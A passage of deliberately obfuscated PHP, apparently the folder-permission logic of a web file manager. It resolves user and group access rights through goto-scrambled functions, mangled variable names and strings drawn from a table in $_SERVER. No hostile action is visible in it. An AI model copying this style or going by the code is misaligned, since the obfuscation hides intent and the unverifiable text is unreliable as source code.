$eê»‰îˆ¼Ã = Model($bˆƒ‡ÇŞÑÚ[507])->getInfoSimpleOuter($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[498]]); if ($eê»‰îˆ¼Ã[$bˆƒ‡ÇŞÑÚ[1564]] == $bˆƒ‡ÇŞÑÚ[1118]) { continue; } if ($eê»‰îˆ¼Ã[$bˆƒ‡ÇŞÑÚ[1564]] == $bˆƒ‡ÇŞÑÚ[191]) { $eê»‰îˆ¼Ã[$bˆƒ‡ÇŞÑÚ[28]] = LNG($bˆƒ‡ÇŞÑÚ[1909]); } } else { $eê»‰îˆ¼Ã = Model($bˆƒ‡ÇŞÑÚ[516])->getInfoSimple($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[498]]); } goto eäŒŠ¿®; eàÌßöÉÙÉ: if ($eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[406]] == SourceModel::TYPE_USER && $eÕ‡©èîŠÓ[$bˆƒ‡ÇŞÑÚ[498]] == $bˆƒ‡ÇŞÑÚ[191]) { $E»Ğ¼¦‚¸Ô = 0; } $dåƒØì±[] = $FœƒÂïØ[$bˆƒ‡ÇŞÑÚ[408]] + $E»Ğ¼¦‚¸Ô; goto ağ…ÂÑÑÆÑ; ağ…ÂÑÑÆÑ: } array_multisort($dåƒØì±, SORT_DESC, $EèÜ¬®¢à¹); goto eŒ§ô; eŒ§ô: return $EèÜ¬®¢à¹; goto CÀ¼´ğŒ©Ø; CÀ¼´ğŒ©Ø: } public function getAllChildrenByUser($eæ¶Á”äÍ, $AëÒ»µõİ) { goto fÛ—Â‚×·í; d¡Ã±¡ŠåÉ: $CÄŠĞŞ©ç÷ = Model($dÑ¯“ç­…[1239])->sourceInfo($eæ¶Á”äÍ); $CÂ”ßã·“¼ = array(); $FÁİ¢×Û– = 1; goto fÉÌ÷¨¥êÉ; fÉÌ÷¨¥êÉ: if ($CÄŠĞŞ©ç÷[$dÑ¯“ç­…[492]] == $dÑ¯“ç­…[191] && $CÄŠĞŞ©ç÷[$dÑ¯“ç­…[498]] != $FÁİ¢×Û– && $this->groupContainUser($CÄŠĞŞ©ç÷[$dÑ¯“ç­…[498]], $AëÒ»µõİ)) { foreach ($Eô¢ÑáâÒÌ[$dÑ¯“ç­…[1910]] as $B‹åÀçğ˜Ö) { $Fê¬ŠŠ¡ø = Model($dÑ¯“ç­…[516])->getInfo($B‹åÀçğ˜Ö[$dÑ¯“ç­…[1733]]); $D™Í¯æòÅ£ = Model($dÑ¯“ç­…[532])->getInfoSimpleOuter($AëÒ»µõİ); $D™Í¯æòÅ£[$dÑ¯“ç­…[460]] = $B‹åÀçğ˜Ö[$dÑ¯“ç­…[408]]; if (Model($dÑ¯“ç­…[501])->authCheckAction($B‹åÀçğ˜Ö[$dÑ¯“ç­…[408]][$dÑ¯“ç­…[408]], $dÑ¯“ç­…[1753])) { continue; } $b²¸ºˆÌ‘  = array($dÑ¯“ç­…[28] => $dÑ¯“ç­…[1516] . $Fê¬ŠŠ¡ø[$dÑ¯“ç­…[28]], $dÑ¯“ç­…[397] => $Fê¬ŠŠ¡ø[$dÑ¯“ç­…[85]][$dÑ¯“ç­…[397]], $dÑ¯“ç­…[76] => KodIO::make($Fê¬ŠŠ¡ø[$dÑ¯“ç­…[85]][$dÑ¯“ç­…[397]]), $dÑ¯“ç­…[492] => $dÑ¯“ç­…[191], $dÑ¯“ç­…[406] => $dÑ¯“ç­…[509], $dÑ¯“ç­…[29] => $dÑ¯“ç­…[542], $dÑ¯“ç­…[513] => $Fê¬ŠŠ¡ø[$dÑ¯“ç­…[520]], $dÑ¯“ç­…[1733] => $Fê¬ŠŠ¡ø[$dÑ¯“ç­…[1733]], $dÑ¯“ç­…[517] => $Fê¬ŠŠ¡ø[$dÑ¯“ç­…[492]], $dÑ¯“ç­…[1907] => array($D™Í¯æòÅ£)); $CÂ”ßã·“¼[$b²¸ºˆÌ‘ [$dÑ¯“ç­…[397]]] = $b²¸ºˆÌ‘ ; } } $b‹Å”»î¤ = array(); $aÙ¯õ‰³©‚ = $this->getAllChildren($eæ¶Á”äÍ); goto AÀèÛ¥Ôæ; Eƒ°ï«È³: return $b‹Å”»î¤; goto DòŞæÂŒ‹»; fÛ—Â‚×·í: $dÑ¯“ç­… =& $_SERVER[›é¼±]; $Eô¢ÑáâÒÌ = Model($dÑ¯“ç­…[532])->getInfo($AëÒ»µõİ); if (!$AëÒ»µõİ || !$eæ¶Á”äÍ || !$Eô¢ÑáâÒÌ) { return array(); } goto d¡Ã±¡ŠåÉ; AÀèÛ¥Ôæ: foreach ($aÙ¯õ‰³©‚ as $AùÂ‚©·ˆ„) { $f£–…ˆµê = !1; foreach ($AùÂ‚©·ˆ„[$dÑ¯“ç­…[1907]] as $B¥¶Ÿò´ä‹) { if ($B¥¶Ÿò´ä‹[$dÑ¯“ç­…[1564]]) { if ($B¥¶Ÿò´ä‹[$dÑ¯“ç­…[1564]] == $AëÒ»µõİ) { $f£–…ˆµê = !0; break; } } if ($B¥¶Ÿò´ä‹[$dÑ¯“ç­…[1733]]) { if ($this->groupContainUser($B¥¶Ÿò´ä‹[$dÑ¯“ç­…[1733]], $AëÒ»µõİ)) { $f£–…ˆµê = !0; break; } } } if ($f£–…ˆµê) { $b‹Å”»î¤[] = $AùÂ‚©·ˆ„; } $c‰ÕĞ³ğ´‹ = $AùÂ‚©·ˆ„[$dÑ¯“ç­…[397]]; if (isset($CÂ”ßã·“¼[$c‰ÕĞ³ğ´‹])) { $AùÂ‚©·ˆ„[$dÑ¯“ç­…[1907]][] = $CÂ”ßã·“¼[$c‰ÕĞ³ğ´‹][0]; $CÂ”ßã·“¼[$c‰ÕĞ³ğ´‹] = !1; } } $CÂ”ßã·“¼ = array_filter(array_values($CÂ”ßã·“¼)); $b‹Å”»î¤ = array_merge($CÂ”ßã·“¼, $b‹Å”»î¤); goto Eƒ°ï«È³; DòŞæÂŒ‹»: } public function setAllChildrenByUser($FØÏğÈì»¼, $AÏ—¸ö”ØÄ, $Fâ¢Œ“×¬) { $c¾Ã–£ÆÆò =& $_SERVER[›é¼±]; $eóœòéä‰è = $this->getAllChildrenByUser($FØÏğÈì»¼, $AÏ—¸ö”ØÄ); if (!$Fâ¢Œ“×¬ || !$eóœòéä‰è) { return !1; } foreach ($eóœòéä‰è as $c…¦ÔÀÃÂ) { $cÉİ¤Å³Í¢ = array(); foreach ($c…¦ÔÀÃÂ[$c¾Ã–£ÆÆò[1907]] as $Cë±íŞÈ·È) { $A²”Ë¹ì‘ = $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[460]]; $cÁ÷÷˜„¸ = $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1564]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $e´®ŸŒÑËÛ = $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1564]] ? $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1564]] : $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1733]]; if ($Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1564]] && $Cë±íŞÈ·È[$c¾Ã–£ÆÆò[1564]] == $AÏ—¸ö”ØÄ) { continue; } $cÉİ¤Å³Í¢[] = array($c¾Ã–£ÆÆò[397] => $c…¦ÔÀÃÂ[$c¾Ã–£ÆÆò[397]], $c¾Ã–£ÆÆò[406] => $cÁ÷÷˜„¸, $c¾Ã–£ÆÆò[498] => intval($e´®ŸŒÑËÛ), $c¾Ã–£ÆÆò[1833] => isset($A²”Ë¹ì‘[$c¾Ã–£ÆÆò[395]]) ? intval($A²”Ë¹ì‘[$c¾Ã–£ÆÆò[395]]) : 0, $c¾Ã–£ÆÆò[1887] => isset($A²”Ë¹ì‘[$c¾Ã–£ÆÆò[1887]]) ? intval($A²”Ë¹ì‘[$c¾Ã–£ÆÆò[1887]]) : -1); } $cÉİ¤Å³Í¢[] = array($c¾Ã–£ÆÆò[397] => $c…¦ÔÀÃÂ[$c¾Ã–£ÆÆò[397]], $c¾Ã–£ÆÆò[406] => SourceModel::TYPE_USER, $c¾Ã–£ÆÆò[498] => intval($AÏ—¸ö”ØÄ), $c¾Ã–£ÆÆò[1833] => intval($Fâ¢Œ“×¬), $c¾Ã–£ÆÆò[1887] => -1); $this->where(array($c¾Ã–£ÆÆò[412] => $c…¦ÔÀÃÂ[$c¾Ã–£ÆÆò[397]]))->delete(); $this->addAll($cÉİ¤Å³Í¢); } return !0; } public function get($EùÖã®„‰Ş) { $Aˆ„ö‰–™Ó = $this->getSourceList(array($EùÖã®„‰Ş), !0); return $Aˆ„ö‰–™Ó[0]; } public function getSourceList($cá§¥·µ“©, $Cê‚Õ˜ñÚï = false, $E³°£Ü‚éÙ = false) { goto c“›‹ãïÒÃ; eÙÙÓÍªó«: if (!$Cê‚Õ˜ñÚï && count($cá§¥·µ“©) == 1) { $Cê‚Õ˜ñÚï = array(); $Cê‚Õ˜ñÚï[$cá§¥·µ“©[0]] = $Fâ•‘´çí»->sourceInfo($cá§¥·µ“©[0]); } if (!$Cê‚Õ˜ñÚï) { $aƒ¦òš‡…Ø = array($d»‚§å“¤[412] => array($d»‚§å“¤[413], $cá§¥·µ“©)); $Cê‚Õ˜ñÚï = $Fâ•‘´çí»->field($d»‚§å“¤[1911])->where($aƒ¦òš‡…Ø)->select(); $Cê‚Õ˜ñÚï = array_to_keyvalue($Cê‚Õ˜ñÚï, $d»‚§å“¤[397]); } $a†Ó±Ìñùœ = $cá§¥·µ“©; goto dœñç«ì‡±; c“›‹ãïÒÃ: $d»‚§å“¤ =& $_SERVER[›é¼±]; if (!$cá§¥·µ“©) { return array(); } $Fâ•‘´çí» = Model($d»‚§å“¤[1239]); goto eÙÙÓÍªó«; dœñç«ì‡±: foreach ($Cê‚Õ˜ñÚï as $b³ïé™¿³í => $cÁ¹·œ®¸Ê) { $f°•Ù“î„Û = $Fâ•‘´çí»->parentLevelArray($cÁ¹·œ®¸Ê[$d»‚§å“¤[515]]); $a†Ó±Ìñùœ = array_merge($a†Ó±Ìñùœ, array($b³ïé™¿³í), array_reverse($f°•Ù“î„Û)); } $a†Ó±Ìñùœ = array_values(array_unique($a†Ó±Ìñùœ)); if (!$a†Ó±Ìñùœ) { return array(); } goto dİ¡ÎƒªÔ; dİ¡ÎƒªÔ: $aì­¼ğëÇÚ = $this->sourceAuthSelect($a†Ó±Ìñùœ); $fÏÀÃª±‰ = array(); foreach ($a†Ó±Ìñùœ as $b¹¿®»á—±) { if (isset($aì­¼ğëÇÚ[$b¹¿®»á—±])) { $fÏÀÃª±‰[$b¹¿®»á—±] = $aì­¼ğëÇÚ[$b¹¿®»á—±]; } } goto e“æµ·Â‡İ; e“æµ·Â‡İ: $FÉ®ñ½œ“Ğ = $this->userIsRoot($E³°£Ü‚éÙ); $EÎ—Î¾ìÑ‚ = AuthModel::authAll(); $AĞŒ‚›Í§‘ = array($d»‚§å“¤[409] => $EÎ—Î¾ìÑ‚, $d»‚§å“¤[1912] => array($d»‚§å“¤[414] => 0, $d»‚§å“¤[1739] => $EÎ—Î¾ìÑ‚, $d»‚§å“¤[415] => LNG($d»‚§å“¤[1913]), $d»‚§å“¤[1755] => $d»‚§å“¤[1914])); goto C—æËÓƒî²; C—æËÓƒî²: $d¯Ğ’šá = array(); foreach ($Cê‚Õ˜ñÚï as $b¹¿®»á—± => $AŠ·Æ†ª˜) { if ($FÉ®ñ½œ“Ğ) { $d¯Ğ’šá[$b¹¿®»á—±] = $AĞŒ‚›Í§‘; continue; } $d¯Ğ’šá[$b¹¿®»á—±] = $this->makeSourceAuth($AŠ·Æ†ª˜, $fÏÀÃª±‰, $E³°£Ü‚éÙ); } return $d¯Ğ’šá; goto Dº¯³¸ƒÂÒ; Dº¯³¸ƒÂÒ: } public function authDeepCheck($E½ğ”ƒªËœ, $DØÊÛÚµˆ = false) { goto AíéÍØù›; AíéÍØù›: $C¼²œÂ¾ğ =& $_SERVER[›é¼±]; $DØÊÛÚµˆ = $DØÊÛÚµˆ ? $DØÊÛÚµˆ : USER_ID; $CŒŒŒª¯› = $this->makeAuthDeep($DØÊÛÚµˆ); goto c’¼öîéÁĞ; cùóìßÛµ: if (!$CÌ³µÚˆ˜ó) { return !1; } $f—ÏÈñš¡ = $CÌ³µÚˆ˜ó ? $CÌ³µÚˆ˜ó[0] : $E½ğ”ƒªËœ; return array($C¼²œÂ¾ğ[409] => -1, $C¼²œÂ¾ğ[460] => array($C¼²œÂ¾ğ[414] => $C¼²œÂ¾ğ[1118], $C¼²œÂ¾ğ[1739] => $C¼²œÂ¾ğ[191], $C¼²œÂ¾ğ[415] => LNG($C¼²œÂ¾ğ[1917]), $C¼²œÂ¾ğ[1755] => $C¼²œÂ¾ğ[1918]), $C¼²œÂ¾ğ[1919] => LNG($C¼²œÂ¾ğ[1920]), $C¼²œÂ¾ğ[1921] => $this->sourceAuthInfo($f—ÏÈñš¡)); goto DÒ¥áÏÒÚŒ; c’¼öîéÁĞ: if (!in_array($E½ğ”ƒªËœ, $CŒŒŒª¯›[$C¼²œÂ¾ğ[1915]])) { return !1; } $CÌ³µÚˆ˜ó = array(); foreach ($CŒŒŒª¯›[$C¼²œÂ¾ğ[1916]] as $aŠÒåŒ›™¡ => $a³ÃĞÔø¿) { if (!in_array($E½ğ”ƒªËœ, $a³ÃĞÔø¿)) { continue; } $CÌ³µÚˆ˜ó[] = $aŠÒåŒ›™¡; } goto cùóìßÛµ; DÒ¥áÏÒÚŒ: } protected function makeAuthDeep($B¦ä‹“ñÊŒ = false) { goto A²È´Ş²®˜; dÙƒòªË®…: $dÏíÅ¨£¬ = array(); $fò¢Õ£ë›í = array(); $c¸ë·ïÊƒ  = array(); goto AƒÈˆÚ‡É¤; a°‘¹½ç•¡: $e¹†É«á¼ = $f„‘Ö­¥ŠÍ; foreach ($e¹†É«á¼ as $Bäåñ²å­») { $dùîª±ÜŠÎ = $B¹ÀæÃì›->getInfo($Bäåñ²å­»); $aÊßˆŒ¯¦ = $Aß°­™–æÉ->parentLevelArray($dùîª±ÜŠÎ[$d±‚©ŒŒÖ‹[515]]); $f„‘Ö­¥ŠÍ = array_merge($f„‘Ö­¥ŠÍ, $aÊßˆŒ¯¦); } $f„‘Ö­¥ŠÍ = array_values(array_unique($f„‘Ö­¥ŠÍ)); goto FÇÅîÀˆ; a¶É…ò“¥³: if (isset($dî¢ëÎßê²[$B¦ä‹“ñÊŒ])) { return $dî¢ëÎßê²[$B¦ä‹“ñÊŒ]; } $FˆØ„­¾ÃÏ = Model($d±‚©ŒŒÖ‹[1922])->listData(); $F™Û¼ªˆÖ = array(); goto b¾îç´Ş¹ˆ; FÑ…„Ûæá: if ($b³öóä‰£…) { $D¨ÍŒ¤Ò³ = array(array($d±‚©ŒŒÖ‹[406] => SourceModel::TYPE_USER, $d±‚©ŒŒÖ‹[498] => $B¦ä‹“ñÊŒ), array($d±‚©ŒŒÖ‹[406] => SourceModel::TYPE_GROUP, $d±‚©ŒŒÖ‹[498] => array($d±‚©ŒŒÖ‹[413], $b³öóä‰£…)), $d±‚©ŒŒÖ‹[992] => $d±‚©ŒŒÖ‹[1825]); } $d©ÅÚ°»÷¦ = $this->field($d±‚©ŒŒÖ‹[1923])->where($D¨ÍŒ¤Ò³)->select(); $Féµœ‹ªÚÁ = array(); goto fËØÓØ›©­; A²È´Ş²®˜: $d±‚©ŒŒÖ‹ =& $_SERVER[›é¼±]; static $dî¢ëÎßê² = array(); $B¦ä‹“ñÊŒ = $B¦ä‹“ñÊŒ ? $B¦ä‹“ñÊŒ : USER_ID; goto a¶É…ò“¥³; fËØÓØ›©­: $Cã¥…¬çì = array_to_keyvalue_group($d©ÅÚ°»÷¦, $d±‚©ŒŒÖ‹[397]); foreach ($Cã¥…¬çì as $eËÇĞ´…Óá => $aˆ‹Û¤ìƒ) { $BªÁªœ¾–ë = $this->authArrayCheck($aˆ‹Û¤ìƒ, $B¦ä‹“ñÊŒ); if ($BªÁªœ¾–ë[$d±‚©ŒŒÖ‹[409]] > 0) { $Féµœ‹ªÚÁ[] = $eËÇĞ´…Óá . $d±‚©ŒŒÖ‹[33]; } } $dîÇº‰İ²¼ = array(); goto c¹¼Ã„‚§‚; c¯ –ßõÉê: $bÑòª®Åƒö = array($d±‚©ŒŒÖ‹[1915] => $dîÇº‰İ²¼, $d±‚©ŒŒÖ‹[1916] => $dÏíÅ¨£¬); $dî¢ëÎßê²[$B¦ä‹“ñÊŒ] = $bÑòª®Åƒö; return $bÑòª®Åƒö; goto Eƒ‘¶øˆµÍ; c¹¼Ã„‚§‚: $f„‘Ö­¥ŠÍ = $b³öóä‰£…; $Aß°­™–æÉ = Model($d±‚©ŒŒÖ‹[1239]); $B¹ÀæÃì› = Model($d±‚©ŒŒÖ‹[516]); goto dÙƒòªË®…; AƒÈˆÚ‡É¤: $aŠçèö«ù = array(); if ($Féµœ‹ªÚÁ) { $fô¤åØšæ = $Aß°­™–æÉ->where(array($d±‚©ŒŒÖ‹[397] => array($d±‚©ŒŒÖ‹[413], $Féµœ‹ªÚÁ)))->select(); foreach ($fô¤åØšæ as $dá‰ÖÊ›Şê) { $aÊßˆŒ¯¦ = $Aß°­™–æÉ->parentLevelArray($dá‰ÖÊ›Şê[$d±‚©ŒŒÖ‹[515]]); $dîÇº‰İ²¼ = array_merge($dîÇº‰İ²¼, $aÊßˆŒ¯¦); $f„‘Ö­¥ŠÍ[] = $dá‰ÖÊ›Şê[$d±‚©ŒŒÖ‹[498]]; $dÏíÅ¨£¬[$dá‰ÖÊ›Şê[$d±‚©ŒŒÖ‹[397]]] = $aÊßˆŒ¯¦; $fò¢Õ£ë›í[$dá‰ÖÊ›Şê[$d±‚©ŒŒÖ‹[397]]] = $dá‰ÖÊ›Şê[$d±‚©ŒŒÖ‹[498]]; } } $f„‘Ö­¥ŠÍ = array_values(array_unique($f„‘Ö­¥ŠÍ)); goto a°‘¹½ç•¡; b¾îç´Ş¹ˆ: foreach ($FˆØ„­¾ÃÏ as $d”Á‹˜®¤) { if ($d”Á‹˜®¤[$d±‚©ŒŒÖ‹[408]] == 0 && $d”Á‹˜®¤[$d±‚©ŒŒÖ‹[1754]] == $d±‚©ŒŒÖ‹[87]) { $F™Û¼ªˆÖ[] = $d”Á‹˜®¤[$d±‚©ŒŒÖ‹[395]]; } } $b³öóä‰£… = $this->userGroupParents($B¦ä‹“ñÊŒ); $D¨ÍŒ¤Ò³ = array($d±‚©ŒŒÖ‹[406] => SourceModel::TYPE_USER, $d±‚©ŒŒÖ‹[498] => $B¦ä‹“ñÊŒ); goto FÑ…„Ûæá; FÇÅîÀˆ: foreach ($f„‘Ö­¥ŠÍ as $Bäåñ²å­») { $dùîª±ÜŠÎ = $B¹ÀæÃì›->getInfo($Bäåñ²å­»); $dîÇº‰İ²¼[] = $dùîª±ÜŠÎ[$d±‚©ŒŒÖ‹[85]][$d±‚©ŒŒÖ‹[397]]; $c¸ë·ïÊƒ [$Bäåñ²å­»] = $dùîª±ÜŠÎ[$d±‚©ŒŒÖ‹[85]][$d±‚©ŒŒÖ‹[397]]; $aŠçèö«ù[$Bäåñ²å­»] = $Aß°­™–æÉ->parentLevelArray($dùîª±ÜŠÎ[$d±‚©ŒŒÖ‹[515]]); } foreach ($dÏíÅ¨£¬ as $E»Åš—óğ => $b¾éˆÁóÃİ) { $cÕ÷› —¹ = $fò¢Õ£ë›í[$E»Åš—óğ]; if (!$cÕ÷› —¹ || !$c¸ë·ïÊƒ [$cÕ÷› —¹]) { continue; } $Eõ•¨Ô­ = array(); foreach ($aŠçèö«ù[$cÕ÷› —¹] as $Bäåñ²å­») { $Eõ•¨Ô­[] = $c¸ë·ïÊƒ [$Bäåñ²å­»]; } $dÏíÅ¨£¬[$E»Åš—óğ] = array_merge($Eõ•¨Ô­, $b¾éˆÁóÃİ); } $dîÇº‰İ²¼ = array_values(array_unique($dîÇº‰İ²¼)); goto c¯ –ßõÉê; Eƒ‘¶øˆµÍ: } private function makeSourceAuth($bÛ„†µ½´–, $Aè¶®Çæ, $F³ŠÔ™ÂˆÂ = false) { goto BÚæÙ¹’ÉŞ; D‹½…ïÙƒ§: $Cª™¿œ¿Ü = Model($dÕ¬ƒÆ»Ñ[1239])->parentLevelArray($bÛ„†µ½´–[$dÕ¬ƒÆ»Ñ[515]]); $Cª™¿œ¿Ü = array_merge(array($bÛ„†µ½´–[$dÕ¬ƒÆ»Ñ[397]]), array_reverse($Cª™¿œ¿Ü)); $ešñö¿‘Ø× = !1; goto eéª—¿‡; F¿à¾ö¾Ì: $eª„í‡«¿— = $bÛ„†µ½´–[$dÕ¬ƒÆ»Ñ[406]] == SourceModel::TYPE_GROUP; $Fò¦ùšá‰ã = $eª„í‡«¿— ? $this->groupRootAuth($b£–™Óì‚Ê, $F³ŠÔ™ÂˆÂ) : !1; if ($Fò¦ùšá‰ã && Model($dÕ¬ƒÆ»Ñ[501])->authCheckAction($Fò¦ùšá‰ã[$dÕ¬ƒÆ»Ñ[408]], $dÕ¬ƒÆ»Ñ[1753])) { return $this->groupAuthInfo($Fò¦ùšá‰ã, $b£–™Óì‚Ê); } goto D‹½…ïÙƒ§; AÆæøŠÎÑÜ: if (!$ešñö¿‘Ø×) { $B Š˜®»â = Model($dÕ¬ƒÆ»Ñ[516])->getInfo($b£–™Óì‚Ê); $aƒÕœâ¤¨ = explode($dÕ¬ƒÆ»Ñ[47], trim($B Š˜®»â[$dÕ¬ƒÆ»Ñ[515]], $dÕ¬ƒÆ»Ñ[47])); $aƒÕœâ¤¨ = array_reverse($aƒÕœâ¤¨); foreach ($aƒÕœâ¤¨ as $D¶‘¯¼²¬) { if ($D¶‘¯¼²¬ == $dÕ¬ƒÆ»Ñ[191] || $D¶‘¯¼²¬ == $f…°¯¡Ã¢Ì) { continue; } $c®ó™±Á† = $this->groupRootAuth($D¶‘¯¼²¬, $F³ŠÔ™ÂˆÂ); if (!$c®ó™±Á†) { continue; } $ešñö¿‘Ø× = $this->groupAuthInfo($c®ó™±Á†, $D¶‘¯¼²¬); break; } } if (!$ešñö¿‘Ø× || $ešñö¿‘Ø×[$dÕ¬ƒÆ»Ñ[409]] <= 0) { $fË¿ƒË†èº = $this->authDeepCheck($bÛ„†µ½´–[$dÕ¬ƒÆ»Ñ[397]], $F³ŠÔ™ÂˆÂ); if ($fË¿ƒË†èº) { $ešñö¿‘Ø× = $fË¿ƒË†èº; } } return $ešñö¿‘Ø×; goto e„Óø¿“ˆ›; eéª—¿‡: foreach ($Cª™¿œ¿Ü as $C¤œİ¾Ô™´) { if (!isset($Aè¶®Çæ[$C¤œİ¾Ô™´])) { continue; } $B‹¥«ï‘Ä = $this->authMake($Aè¶®Çæ[$C¤œİ¾Ô™´], $F³ŠÔ™ÂˆÂ); if ($B‹¥«ï‘Ä[$dÕ¬ƒÆ»Ñ[460]]) { $ešñö¿‘Ø× = $B‹¥«ï‘Ä; break; } } if (!$eª„í‡«¿—) { return $ešñö¿‘Ø×; } if (!$ešñö¿‘Ø× && $Fò¦ùšá‰ã) { $ešñö¿‘Ø× = $this->groupAuthInfo($Fò¦ùšá‰ã, $b£–™Óì‚Ê); } goto AÆæøŠÎÑÜ; BÚæÙ¹’ÉŞ: $dÕ¬ƒÆ»Ñ =& $_SERVER[›é¼±]; $f…°¯¡Ã¢Ì = $dÕ¬ƒÆ»Ñ[87]; $b£–™Óì‚Ê = $bÛ„†µ½´–[$dÕ¬ƒÆ»Ñ[498]]; goto F¿à¾ö¾Ì; e„Óø¿“ˆ›: } private function userIsRoot($bó‚Í³®Öò = false) { $eÛî“œ¼ÃÚ =& $_SERVER[›é¼±]; if (!$bó‚Í³®Öò && _get($GLOBALS, $eÛî“œ¼ÃÚ[499])) { return !0; } $B›ª¤‹¦†Ş = Model($eÛî“œ¼ÃÚ[532])->getInfo($bó‚Í³®Öò); $dÂÊÔ®ö˜” = Model($eÛî“œ¼ÃÚ[1924])->listData($B›ª¤‹¦†Ş[$eÛî“œ¼ÃÚ[1444]]); if ($dÂÊÔ®ö˜” && $dÂÊÔ®ö˜”[$eÛî“œ¼ÃÚ[505]][$eÛî“œ¼ÃÚ[1925]] == 1) { return !0; } return !1; } private function sourceAuthInfo($e…Âò‘š ) { goto C³š»‘´Í; BÙ´©‚ŞÃˆ: $fõ‡Âœ¸¸ø = $aÀæ„„îË->_listAppendPath($fõ‡Âœ¸¸ø); $F×Õ…‘ãÒ = $fõ‡Âœ¸¸ø[0]; $d‘¨ñ†ôï‹ = $F×Õ…‘ãÒ[$Añ§¿ËÃ¨[513]]; goto FôÕ‘¤¨Ù¢; C³š»‘´Í: $Añ§¿ËÃ¨ =& $_SERVER[›é¼±]; $aÀæ„„îË = Model($Añ§¿ËÃ¨[1239]); $F×Õ…‘ãÒ = $aÀæ„„îË->sourceInfo($e…Âò‘š ); goto B¿ˆƒÃ¹ß«; B¿ˆƒÃ¹ß«: if (!$F×Õ…‘ãÒ) { return !1; } $aÀæ„„îË->groupPathDisplay($F×Õ…‘ãÒ); $fõ‡Âœ¸¸ø = array($F×Õ…‘ãÒ); goto BÙ´©‚ŞÃˆ; FôÕ‘¤¨Ù¢: if (isset($F×Õ…‘ãÒ[$Añ§¿ËÃ¨[521]])) { $c‹Ù½©¸¶º = explode($Añ§¿ËÃ¨[8], trim($F×Õ…‘ãÒ[$Añ§¿ËÃ¨[513]], $Añ§¿ËÃ¨[8])); array_shift($c‹Ù½©¸¶º); $d‘¨ñ†ôï‹ = $F×Õ…‘ãÒ[$Añ§¿ËÃ¨[519]] . $Añ§¿ËÃ¨[1926] . implode($Añ§¿ËÃ¨[8], $c‹Ù½©¸¶º); } return array($Añ§¿ËÃ¨[415] => $F×Õ…‘ãÒ[$Añ§¿ËÃ¨[28]], $Añ§¿ËÃ¨[76] => KodIO::make($F×Õ…‘ãÒ[$Añ§¿ËÃ¨[397]]), $Añ§¿ËÃ¨[1927] => $d‘¨ñ†ôï‹); goto dáÂöó¡°; dáÂöó¡°: } private function groupAuthInfo($c¬êî”¸†, $bİì¡ï–³ë) { $D½ÁÒÎÓ„Ë =& $_SERVER[›é¼±]; $bŒ¢î¤¹—Â = Model($D½ÁÒÎÓ„Ë[516])->getInfo($bİì¡ï–³ë); return array($D½ÁÒÎÓ„Ë[1928] => intval($c¬êî”¸†[$D½ÁÒÎÓ„Ë[408]]), $D½ÁÒÎÓ„Ë[1912] => $c¬êî”¸†, $D½ÁÒÎÓ„Ë[1929] => LNG($D½ÁÒÎÓ„Ë[1930]), $D½ÁÒÎÓ„Ë[1921] => array($D½ÁÒÎÓ„Ë[415] => $bŒ¢î¤¹—Â[$D½ÁÒÎÓ„Ë[28]], $D½ÁÒÎÓ„Ë[76] => KodIO::make($bŒ¢î¤¹—Â[$D½ÁÒÎÓ„Ë[85]][$D½ÁÒÎÓ„Ë[397]]), $D½ÁÒÎÓ„Ë[1927] => $bŒ¢î¤¹—Â[$D½ÁÒÎÓ„Ë[520]])); } protected function groupRootAuth($DÏ®ÒäßÇ…, $b°ÆÒÙŒ¢ = false) { goto cèåâ´¼…ê; cèåâ´¼…ê: $aé‡ø‹äÏ =& $_SERVER[›é¼±]; $b°ÆÒÙŒ¢ = $b°ÆÒÙŒ¢ ? $b°ÆÒÙŒ¢ : USER_ID; $Dà×ˆ‡İ†É = $b°ÆÒÙŒ¢ . $aé‡ø‹äÏ[1931] . $DÏ®ÒäßÇ…; goto A±À›†Õï; F´­«”­Œö: $dÅî³Àõõ = $this->sourceAuthSelect($AÉø‡¾éç›[$aé‡ø‹äÏ[85]][$aé‡ø‹äÏ[397]]); $f¸’¬÷Øçç = $dÅî³Àõõ ? $this->authMake($dÅî³Àõõ, $b°ÆÒÙŒ¢) : !1; $FÏ½ï•â«ğ = $f¸’¬÷Øçç ? $f¸’¬÷Øçç[$aé‡ø‹äÏ[460]] : !1; goto B¦ÃòªÏ; fîä»·”²: $A™¬ÉÏ‡à = $this->userGroupList($b°ÆÒÙŒ¢); $D°º¬ãÒÜ = isset($A™¬ÉÏ‡à[$DÏ®ÒäßÇ…]) ? $A™¬ÉÏ‡à[$DÏ®ÒäßÇ…][$aé‡ø‹äÏ[408]] : !1; if ($D°º¬ãÒÜ && Model($aé‡ø‹äÏ[501])->authCheckAction($D°º¬ãÒÜ[$aé‡ø‹äÏ[408]], $aé‡ø‹äÏ[1753])) { $a˜¦êÉ‰·Ë[$Dà×ˆ‡İ†É] = $D°º¬ãÒÜ; return $D°º¬ãÒÜ; } goto F´­«”­Œö; B¦ÃòªÏ: $a˜¦êÉ‰·Ë[$Dà×ˆ‡İ†É] = $FÏ½ï•â«ğ ? $FÏ½ï•â«ğ : $D°º¬ãÒÜ; return $a˜¦êÉ‰·Ë[$Dà×ˆ‡İ†É]; goto EÂ¯à„ÒÌÙ; A±À›†Õï: static $a˜¦êÉ‰·Ë = array(); if (isset($a˜¦êÉ‰·Ë[$Dà×ˆ‡İ†É])) { return $a˜¦êÉ‰·Ë[$Dà×ˆ‡İ†É]; } $AÉø‡¾éç› = Model($aé‡ø‹äÏ[516])->getInfo($DÏ®ÒäßÇ…); goto fîä»·”²; EÂ¯à„ÒÌÙ: } public function authOwnerApply($d˜ôõ¶£§ã) { goto f‡‡ì«Ìµõ; f‡‡ì«Ìµõ: $b–®ËÕòßØ =& $_SERVER[›é¼±]; if (empty($d˜ôõ¶£§ã[$b–®ËÕòßØ[408]]) || isset($d˜ôõ¶£§ã[$b–®ËÕòßØ[1932]]) && $d˜ôõ¶£§ã[$b–®ËÕòßØ[1932]]) { return $d˜ôõ¶£§ã; } if (AuthModel::authCheckRoot($d˜ôõ¶£§ã[$b–®ËÕòßØ[408]][$b–®ËÕòßØ[409]])) { 